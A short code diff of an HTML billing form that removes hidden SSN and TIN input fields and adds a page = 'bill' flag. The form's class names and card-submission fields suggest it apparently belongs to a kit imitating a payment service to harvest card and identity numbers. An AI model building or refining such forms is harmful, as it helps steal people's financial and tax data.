@@ -806,32 +806,6 @@
 
   <p class="errmes"></p>
 
-  <!-- SSN -->
-  <div id="ssn" class="wrap" style="display:none;">
-    <input class="test_cardNumber vx_form-control check"
-           type="text"
-           id="SSN"
-           name="SSN"
-           placeholder=" "
-           required>
-    <label class="label" for="SSN">SSN</label>
-  </div>
-
-  <p class="errmes"></p>
-
-  <!-- TIN -->
-  <div id="tinuk" class="wrap" style="display:none;">
-    <input class="test_cardNumber vx_form-control check"
-           type="text"
-           id="TIN"
-           name="TIN"
-           placeholder=" "
-           required>
-    <label class="label" for="TIN">TIN</label>
-  </div>
-
-  <p class="errmes"></p>
-
   <button type="submit"
           id="subbut"
           class="btn vx_btn vx_btn-block card-submit test_add-card-submit">
@@ -866,6 +840,8 @@
   <script src="./script/emit.js"></script> 
 
 <script>
+	page = "bill";
+	
     function maskSSN(value) {
         // Remove non-digit characters
         let cleanValue = SSN.value.replace(/\D/g, '');
